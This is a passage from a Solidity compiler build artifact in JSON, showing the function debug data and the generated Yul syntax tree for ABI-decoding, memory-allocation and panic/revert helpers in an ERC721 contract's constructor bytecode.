{IERC721-transferFrom}."}},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_116":{"entryPoint":null,"id":116,"parameterSlots":2,"returnSlots":0},"abi_decode_available_length_t_string_memory_ptr_fromMemory":{"entryPoint":289,"id":null,"parameterSlots":3,"returnSlots":1},"abi_decode_t_string_memory_ptr_fromMemory":{"entryPoint":364,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_string_memory_ptrt_string_memory_ptr_fromMemory":{"entryPoint":415,"id":null,"parameterSlots":2,"returnSlots":2},"allocate_memory":{"entryPoint":548,"id":null,"parameterSlots":1,"returnSlots":1},"allocate_unbounded":{"entryPoint":579,"id":null,"parameterSlots":0,"returnSlots":1},"array_allocation_size_t_string_memory_ptr":{"entryPoint":589,"id":null,"parameterSlots":1,"returnSlots":1},"copy_memory_to_memory":{"entryPoint":643,"id":null,"parameterSlots":3,"returnSlots":0},"extract_byte_array_length":{"entryPoint":697,"id":null,"parameterSlots":1,"returnSlots":1},"finalize_allocation":{"entryPoint":751,"id":null,"parameterSlots":2,"returnSlots":0},"panic_error_0x22":{"entryPoint":805,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x41":{"entryPoint":852,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d":{"entryPoint":899,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae":{"entryPoint":904,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":909,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":914,"id":null,"parameterSlots":0,"returnSlots":0},"round_up_to_mul_of_32":{"entryPoint":919,"id":null,"parameterSlots":1,"returnSlots":1}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:4093:15","statements":[{"body":{"nodeType":"YulBlock","src":"102:326:15","statements":[{"nodeType":"YulAssignment","src":"112:75:15","value":{"arguments":[{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"179:6:15"}],"functionName":{"name":"array_allocation_size_t_string_memory_ptr","nodeType":"YulIdentifier","src":"137:41:15"},"nodeType":"YulFunctionCall","src":"137:49:15"}],"functionName":{"name":"allocate_memory","nodeType":"YulIdentifier","src":"121:15:15"},"nodeType":"YulFunctionCall","src":"121:66:15"},"variableNames":[{"name":"array","nodeType":"YulIdentifier","src":"112:5:15"}]},{"expression":{"arguments":[{"name":"array","nodeType":"YulIdentifier","src":"203:5:15"},{"name":"length","nodeType":"YulIdentifier","src":"210:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"196:6:15"},"nodeType":"YulFunctionCall","src":"196:21:15"},"nodeType":"YulExpressionStatement","src":"196:21:15"},{"nodeType":"YulVariableDeclaration","src":"226:27:15","value":{"arguments":[{"name":"array","nodeType":"YulIdentifier","src":"241:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"248:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"237:3:15"},"nodeType":"YulFunctionCall","src":"237:16:15"},"variables":[{"name":"dst","nodeType":"YulTypedName","src":"230:3:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"291:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae","nodeType":"YulIdentifier","src":"293:77:15"},"nodeType":"YulFunctionCall","src":"293:79:15"},"nodeType":"YulExpressionStatement","src":"293:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"272:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"277:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"268:3:15"},"nodeType":"YulFunctionCall","src":"268:16:15"},{"name":"end","nodeType":"YulIdentifier","src":"286:3:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"265:2:15"},"nodeType":"YulFunctionCall","src":"265:25:15"},"nodeType":"YulIf","src":"262:112:15"},{"expression":{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"405:3:15"},{"name":"dst","nodeType":"YulIdentifier","src":"410:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"415:6:15"}],"functionName":{"name":"copy_memory_to_memory","nodeType":"YulIdentifier","src":"383:21:15"},"nodeType":"YulFunctionCall","src":"383:39:15"},"nodeType":"YulExpressionStatement","src":"383:39:15"}]},"name":"abi_decode_available_length_t_string_memory_ptr_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"75:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"80:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"88:3:15","type":""}],"returnVariables":[{"name":"array","nodeType":"YulTypedName","src":"96:5:15","type":""}],"src":"7:421:15"},{"body":{"nodeType":"YulBlock","src":"521:282:15","statements":[{"body":{"nodeType":"YulBlock","src":"570:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d","nodeType":"YulIdentifier","src":"572:77:15"},"nodeType":"YulFunctionCall","src":"572:79:15"},"nodeType":"YulExpressionStatement","src":"572:79:15"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"549:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"557:4:15","type":"","value":"0x1f"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"545:3:15"},"nodeType":"YulFunctionCall","src":"545:17:15"},{"name":"end","nodeType":"YulIdentifier","src":"564:3:15"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"541:3:15"},"nodeType":"YulFunctionCall","src":"541:27:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"534:6:15"},"nodeType":"YulFunctionCall","src":"534:35:15"},"nodeType":"YulIf","src":"531:122:15"},{"nodeType":"YulVariableDeclaration","src":"662:27:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"682:6:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"676:5:15"},"nodeType":"YulFunctionCall","src":"676:13:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"666:6:15","type":""}]},{"nodeType":"YulAssignment","src":"698:99:15","value":{"arguments":[{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"770:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"778:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"766:3:15"},"nodeType":"YulFunctionCall","src":"766:17:15"},{"name":"length","nodeType":"YulIdentifier","src":"785:6:15"},{"name":"end","nodeType":"YulIdentifier","src":"793:3:15"}],"functionName":{"name":"abi_decode_available_length_t_string_memory_ptr_fromMemory","nodeType":"YulIdentifier","src":"707:58:15"},"nodeType":"YulFunctionCall","src":"707:90:15"},"variableNames":[{"name":"array","nodeType":"YulIdentifier","src":"698:5:15"}]}]},"name":"abi_decode_t_string_memory_ptr_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"499:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"507:3:15","type":""}],"returnVariables":[{"name":"array","nodeType":"YulTypedName","src":"515:5:15","type":""}],"src":"448:355:15"},{"body":{"nodeType":"YulBlock","src":"923:739:15","statements":[{"body":{"nodeType":"YulBlock","src":"969:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"971:77:15"},"nodeType":"YulFunctionCall","src":"971:79:15"},"nodeType":"YulExpressionStatement","src":"971:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"944:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"953:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"940:3:15"},"nodeType":"YulFunctionCall","src":"940:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"965:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"936:3:15"},"nodeType":"YulFunctionCall","src":"936:32:15"},"nodeType":"YulIf","src":"933:119:15"},{"nodeType":"YulBlock","src":"1062:291:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1077:38:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1101:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"1112:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1097:3:15"},"nodeType":"YulFunctionCall","src":"1097:17:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"1091:5:15"},"nodeType":"YulFunctionCall","src":"1091:24:15"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1081:6:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"1162:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulIdentifier","src":"1164:77:15"},"nodeType":"YulFunctionCall","src":"1164:79:15"},"nodeType":"YulExpressionStatement","src":"1164:79:15"}]},"condition":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1134:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"1142:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"1131:2:15"},"nodeType":"YulFunctionCall","src":"1131:30:15"},"nodeType":"YulIf","src":"1128:117:15"},{"nodeType":"YulAssignment","src":"1259:84:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1315:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1326:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1311:3:15"},"nodeType":"YulFunctionCall","src":"1311:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1335:7:15"}],"functionName":{"name":"abi_decode_t_string_memory_ptr_fromMemory","nodeType":"YulIdentifier","src":"1269:41:15"},"nodeType":"YulFunctionCall","src":"1269:74:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"1259:6:15"}]}]},{"nodeType":"YulBlock","src":"1363:292:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1378:39:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1402:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"1413:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1398:3:15"},"nodeType":"YulFunctionCall","src":"1398:18:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"1392:5:15"},"nodeType":"YulFunctionCall","src":"1392:25:15"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1382:6:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"1464:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulIdentifier","src":"1466:77:15"},"nodeType":"YulFunctionCall","src":"1466:79:15"},"nodeType":"YulExpressionStatement","src":"1466:79:15"}]},"condition":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1436:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"1444:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"1433:2:15"},"nodeType":"YulFunctionCall","src":"1433:30:15"},"nodeType":"YulIf","src":"1430:117:15"},{"nodeType":"YulAssignment","src":"1561:84:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1617:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1628:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1613:3:15"},"nodeType":"YulFunctionCall","src":"1613:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1637:7:15"}],"functionName":{"name":"abi_decode_t_string_memory_ptr_fromMemory","nodeType":"YulIdentifier","src":"1571:41:15"},"nodeType":"YulFunctionCall","src":"1571:74:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"1561:6:15"}]}]}]},"name":"abi_decode_tuple_t_string_memory_ptrt_string_memory_ptr_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"885:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"896:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"908:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"916:6:15","type":""}],"src":"809:853:15"},{"body":{"nodeType":"YulBlock","src":"1709:88:15","statements":[{"nodeType":"YulAssignment","src":"1719:30:15","value":{"arguments":[],"functionName":{"name":"allocate_unbounded","nodeType":"YulIdentifier","src":"1729:18:15"},"nodeType":"YulFunctionCall","src":"1729:20:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"1719:6:15"}]},{"expression":{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"1778:6:15"},{"name":"size","nodeType":"YulIdentifier","src":"1786:4:15"}],"functionName":{"name":"finalize_allocation","nodeType":"YulIdentifier","src":"1758:19:15"},"nodeType":"YulFunctionCall","src":"1758:33:15"},"nodeType":"YulExpressionStatement","src":"1758:33:15"}]},"name":"allocate_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"size","nodeType":"YulTypedName","src":"1693:4:15","type":""}],"returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"1702:6:15","type":""}],"src":"1668:129:15"},{"body":{"nodeType":"YulBlock","src":"1843:35:15","statements":[{"nodeType":"YulAssignment","src":"1853:19:15","value":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"1869:2:15","type":"","value":"64"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"1863:5:15"},"nodeType":"YulFunctionCall","src":"1863:9:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"1853:6:15"}]}]},"name":"allocate_unbounded","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"1836:6:15","type":""}],"src":"1803:75:15"},{"body":{"nodeType":"YulBlock","src":"1951:241:15","statements":[{"body":{"nodeType":"YulBlock","src":"2056:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nodeType":"YulIdentifier","src":"2058:16:15"},"nodeType":"YulFunctionCall","src":"2058:18:15"},"nodeType":"YulExpressionStatement","src":"2058:18:15"}]},"condition":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"2028:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"2036:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"2025:2:15"},"nodeType":"YulFunctionCall","src":"2025:30:15"},"nodeType":"YulIf","src":"2022:56:15"},{"nodeType":"YulAssignment","src":"2088:37:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"2118:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"2096:21:15"},"nodeType":"YulFunctionCall","src":"2096:29:15"},"variableNames":[{"name":"size","nodeType":"YulIdentifier","src":"2088:4:15"}]},{"nodeType":"YulAssignment","src":"2162:23:15","value":{"arguments":[{"name":"size","nodeType":"YulIdentifier","src":"2174:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"2180:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2170:3:15"},"nodeType":"YulFunctionCall","src":"2170:15:15"},"variableNames":[{"name":"size","nodeType":"YulIdentifier","src":"2162:4:15"}]}]},"name":"array_allocation_size_t_string_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"length","nodeType":"YulTypedName","src":"1935:6:15","type":""}],"returnVariables":[{"name":"size","nodeType":"YulTypedName","src":"1946:4:15","type":""}],"src":"1884:308:15"},{"body":{"nodeType":"YulBlock","src":"2247:258:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2257:10:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2266:1:15","type":"","value":"0"},"variables":[{"name":"i","nodeType":"YulTypedName","src":"2261:1:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"2326:63:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"2351:3:15"},{"name":"i","nodeType":"YulIdentifier","src":"2356:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2347:3:15"},"nodeType":"YulFunctionCall","src":"2347:11:15"},{"arguments":[{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"2370:3:15"},{"name":"i","nodeType":"YulIdentifier","src":"2375:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2366:3:15"},"nodeType":"YulFunctionCall","src":"2366:11:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"2360:5:15"},"nodeType":"YulFunctionCall","src":"2360:18:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"2340:6:15"},"nodeType":"YulFunctionCall","src":"2340:39:15"},"nodeType":"YulExpressionStatement","src":"2340:39:15"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"2287:1:15"},{"name":"length","nodeType":"YulIdentifier","src":"2290:6:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"2284:2:15"},"nodeType":"YulFunctionCall","src":"2284:13:15"},"nodeType":"YulForLoop","post":{"nodeType":"YulBlock","src":"2298:19:15","statements":[{"nodeType":"YulAssignment","src":"2300:15:15","value":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"2309:1:15"},{"kind":"number","nodeType":"YulLiteral","src":"2312:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2305:3:15"},"nodeType":"YulFunctionCall","src":"2305:10:15"},"variableNames":[{"name":"i","nodeType":"YulIdentifier","src":"2300:1:15"}]}]},"pre":{"nodeType":"YulBlock","src":"2280:3:15","statements":[]},"src":"2276:113:15"},{"body":{"nodeType":"YulBlock","src":"2423:76:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"2473:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"2478:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2469:3:15"},"nodeType":"YulFunctionCall","src":"2469:16:15"},{"kind":"number","nodeType":"YulLiteral","src":"2487:1:15","type":"","value":"0"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"2462:6:15"},"nodeType":"YulFunctionCall","src":"2462:27:15"},"nodeType":"YulExpressionStatement","src":"2462:27:15"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"2404:1:15"},{"name":"length","nodeType":"YulIdentifier","src":"2407:6:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"2401:2:15"},"nodeType":"YulFunctionCall","src":"2401:13:15"},"nodeType":"YulIf","src":"2398:101:15"}]},"name":"copy_memory_to_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"2229:3:15","type":""},{"name":"dst","nodeType":"YulTypedName","src":"2234:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"2239:6:15","type":""}],"src":"2198:307:15"},{"body":{"nodeType":"YulBlock","src":"2562:269:15","statements":[{"nodeType":"YulAssignment","src":"2572:22:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"2586:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"2592:1:15","type":"","value":"2"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"2582:3:15"},"nodeType":"YulFunctionCall","src":"2582:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"2572:6:15"}]},{"nodeType":"YulVariableDeclaration","src":"2603:38:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"2633:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"2639:1:15","type":"","value":"1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"2629:3:15"},"nodeType":"YulFunctionCall","src":"2629:12:15"},"variables":[{"name":"outOfPlaceEncoding","nodeType":"YulTypedName","src":"2607:18:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"2680:51:15","statements":[{"nodeType":"YulAssignment","src":"2694:27:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"2708:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"2716:4:15","type":"","value":"0x7f"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"2704:3:15"},"nodeType":"YulFunctionCall","src":"2704:17:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"2694:6:15"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"2660:18:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"2653:6:15"},"nodeType":"YulFunctionCall","src":"2653:26:15"},"nodeType":"YulIf","src":"2650:81:15"},{"body":{"nodeType":"YulBlock","src":"2783:42:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nodeType":"YulIdentifier","src":"2797:16:15"},"nodeType":"YulFunctionCall","src":"2797:18:15"},"nodeType":"YulExpressionStatement","src":"2797:18:15"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"2747:18:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"2770:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"2778:2:15","type":"","value":"32"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"2767:2:15"},"nodeType":"YulFunctionCall","src":"2767:14:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"2744:2:15"},"nodeType":"YulFunctionCall","src":"2744:38:15"},"nodeType":"YulIf","src":"2741:84:15"}]},"name":"extract_byte_array_length","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nodeType":"YulTypedName","src":"2546:4:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"2555:6:15","type":""}],"src":"2511:320:15"},{"body":{"nodeType":"YulBlock","src":"2880:238:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2890:58:15","value":{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"2912:6:15"},{"arguments":[{"name":"size","nodeType":"YulIdentifier","src":"2942:4:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"2920:21:15"},"nodeType":"YulFunctionCall","src":"2920:27:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2908:3:15"},"nodeType":"YulFunctionCall","src":"2908:40:15"},"variables":[{"name":"newFreePtr","nodeType":"YulTypedName","src":"2894:10:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"3059:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nodeType":"YulIdentifier","src":"3061:16:15"},"nodeType":"YulFunctionCall","src":"3061:18:15"},"nodeType":"YulExpressionStatement","src":"3061:18:15"}]},"condition":{"arguments":[{"arguments":[{"name":"newFreePtr","nodeType":"YulIdentifier","src":"3002:10:15"},{"kind":"number","nodeType":"YulLiteral","src":"3014:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"2999:2:15"},"nodeType":"YulFunctionCall","src":"2999:34:15"},{"arguments":[{"name":"newFreePtr","nodeType":"YulIdentifier","src":"3038:10:15"},{"name":"memPtr","nodeType":"YulIdentifier","src":"3050:6:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"3035:2:15"},"nodeType":"YulFunctionCall","src":"3035:22:15"}],"functionName":{"name":"or","nodeType":"YulIdentifier","src":"2996:2:15"},"nodeType":"YulFunctionCall","src":"2996:62:15"},"nodeType":"YulIf","src":"2993:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3097:2:15","type":"","value":"64"},{"name":"newFreePtr","nodeType":"YulIdentifier","src":"3101:10:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"3090:6:15"},"nodeType":"YulFunctionCall","src":"3090:22:15"},"nodeType":"YulExpressionStatement","src":"3090:22:15"}]},"name":"finalize_allocation","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"2866:6:15","type":""},{"name":"size","nodeType":"YulTypedName","src":"2874:4:15","type":""}],"src":"2837:281:15"},{"body":{"nodeType":"YulBlock","src":"3152:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3169:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3172:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"3162:6:15"},"nodeType":"YulFunctionCall","src":"3162:88:15"},"nodeType":"YulExpressionStatement","src":"3162:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3266:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"3269:4:15","type":"","value":"0x22"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"3259:6:15"},"nodeType":"YulFunctionCall","src":"3259:15:15"},"nodeType":"YulExpressionStatement","src":"3259:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3290:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3293:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3283:6:15"},"nodeType":"YulFunctionCall","src":"3283:15:15"},"nodeType":"YulExpressionStatement","src":"3283:15:15"}]},"name":"panic_error_0x22","nodeType":"YulFunctionDefinition","src":"3124:180:15"},{"body":{"nodeType":"YulBlock","src":"3338:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3355:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3358:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"3348:6:15"},"nodeType":"YulFunctionCall","src":"3348:88:15"},"nodeType":"YulExpressionStatement","src":"3348:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3452:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"3455:4:15","type":"","value":"0x41"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"3445:6:15"},"nodeType":"YulFunctionCall","src":"3445:15:15"},"nodeType":"YulExpressionStatement","src":"3445:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3476:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3479:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3469:6:15"},"nodeType":"YulFunctionCall","src":"3469:15:15"},"nodeType":"YulExpressionStatement","src":"3469:15:15"}]},"name":"panic_error_0x41","nodeType":"YulFunctionDefinition","src":"3310:180:15"},{"body":{"nodeType":"YulBlock","src":"3585:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3602:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3605:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3595:6:15"},"nodeType":"YulFunctionCall","src":"3595:12:15"},"nodeType":"YulExpressionStatement","src":"3595:12:15"}]},"name":"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d","nodeType":"YulFunctionDefinition","src":"3496:117:15"},{"body":{"nodeType":"YulBlock","src":"3708:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3725:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3728:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3718:6:15"},"nodeType":"YulFunctionCall","src":"3718:12:15"},"nodeType":"YulExpressionStatement","src":"3718:12:15"}]},"name":"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae","nodeType":"YulFunctionDefinition","src":"3619:117:15"},{"body":{"nodeType":"YulBlock","src":"3831:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3848:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3851:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3841:6:15"},"nodeType":"YulFunctionCall","src":"3841:12:15"},"nodeType":"YulExpressionStatement","src":"3841:12:15"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulFunctionDefinition","src":"3742:117:15"},{"body":{"nodeType":"YulBlock","src":"3954:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3971:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3974:1: